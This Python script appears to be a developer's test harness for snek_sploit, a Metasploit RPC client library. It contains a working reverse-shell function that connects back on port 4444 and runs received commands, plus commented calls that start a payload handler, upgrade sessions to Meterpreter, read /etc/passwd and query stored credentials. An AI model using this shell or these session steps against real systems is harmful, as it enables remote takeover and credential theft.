import time

from snek_sploit import Client, MeterpreterSession, ShellSession, SessionInformation
from snek_sploit.lib.rpc.modules import ModuleType
import socket
import subprocess


def create_connection(target, port=4444):
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    so.connect((target, port))
    while True:
        d = so.recv(1024)
        if len(d) == 0:
            break
        p = subprocess.Popen(d, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        o = p.stdout.read() + p.stderr.read()
        so.send(o)


if __name__ == '__main__':
    client = Client("msf", "root", disable_https_warnings=True, verbose=True)
    for each in client.modules.rpc.search("payload/python"):
        print(each.fullname)
    # Run in one terminal, then comment and test sessions freely
    # execution = client.modules.rpc.execute(ModuleType.exploit, "multi/handler", {"PAYLOAD": "python/shell_reverse_tcp", "LHOST": "0.0.0.0", "LPORT": 4444})
    # time.sleep(2)
    # create_connection("localhost")

    # Uncomment and test RPC here
    # print(client.sessions.rpc.list_sessions())
    # console_id = client.consoles.rpc.create().id
    # client.consoles.rpc.read(console_id)
    # client.consoles.rpc.write(console_id, "sessions  -h")
    # time.sleep(2)
    # data = client.consoles.rpc.read(console_id).data
    # print(data)

    # session_id = list(client.sessions.filter(
    #     SessionInformation(via_exploit="multi", via_payload="python")
    # ).keys())[-1]
    # s_session: ShellSession = client.sessions.get(session_id)
    # s_session.upgrade_to_meterpreter("0.0.0.0", 4445)
    # print(client.sessions.all())
    # m_session_id = list(client.sessions.filter(
    #     SessionInformation(via_exploit="multi", via_payload="reverse_tcp")
    # ).keys())[-1]
    # m_session: MeterpreterSession = client.sessions.get(m_session_id)
    # m_session.execute_in_shell("cat", ["/tmp/asd"], minimal_execution_time=5)

    # print(m_session.execute("execute -h"))

    # m_session: MeterpreterSession = client.sessions.get(2)
    # print(m_session.execute("info", minimal_execution_time=3))
    # print(m_session.execute_in_shell("cat", ["/etc/passwd"], minimal_execution_time=3))
    # print(m_session.execute("channel"))
    # print(m_session.execute("read"))
    # print(m_session.execute("write"))
    # print(shell_session.execute("whoami"))
    # shell_session.upgrade_to_meterpreter("0.0.0.0", 4445)
    # print(client.sessions.rpc.list_sessions())
    # client.session.rpc.meterpreter_read(4)
    # client.session.rpc.meterpreter_session_kill(4)
    # client.session.rpc.meterpreter_write(4, "help")
    # time.sleep(1)
    # client.session.rpc.meterpreter_read(4)
    # client.session.rpc.shell_write(3, 'echo "asd"')
    # time.sleep(2)
    # client.session.rpc.shell_read(3)
    #
    # client.session.rpc.shell_write(3, 'echo "dsa"')
    # time.sleep(2)
    # client.session.rpc.shell_read(3)
    # client.session.rpc.ring_last(3)
    # client.session.rpc.shell_upgrade(3, "0.0.0.0", 4445)
    # client.session.rpc.ring_read(4)

    # client.db.rpc.create_cracked_credential()
    # client.db.rpc.create_credential()
    # client.db.rpc.invalidate_login()
    # client.db.rpc.creds()
    # client.db.rpc.del_creds()
    # client.db.rpc.hosts()
    # client.db.rpc.services()
    # client.db.rpc.vulns()
    # client.db.rpc.workspaces()
    # client.db.rpc.current_workspace()
    # client.db.rpc.get_workspace()
    # client.db.rpc.set_workspace()
    # client.db.rpc.del_workspace()
    # client.db.rpc.add_workspace()
    # client.db.rpc.get_host()
    # client.db.rpc.analyze_host()
    # client.db.rpc.report_host()
    # client.db.rpc.report_service()
    # client.db.rpc.get_service()
    # client.db.rpc.get_note()
    # client.db.rpc.get_client()
    # client.db.rpc.report_client()
    # client.db.rpc.report_note()
    # client.db.rpc.notes()
    # client.db.rpc.get_ref()
    # client.db.rpc.del_vuln()
    # client.db.rpc.del_note()
    # client.db.rpc.del_service()
    # client.db.rpc.del_host()
    # client.db.rpc.report_vuln()
    # client.db.rpc.events()
    # client.db.rpc.report_event()
    # client.db.rpc.report_loot()
    # client.db.rpc.loots()
    # client.db.rpc.import_data()
    # client.db.rpc.get_vuln()
    # client.db.rpc.clients()
    # client.db.rpc.del_client()
    # client.db.rpc.driver()
    # client.db.rpc.connect()
    # client.db.rpc.disconnect()
    # client.db.rpc.status()
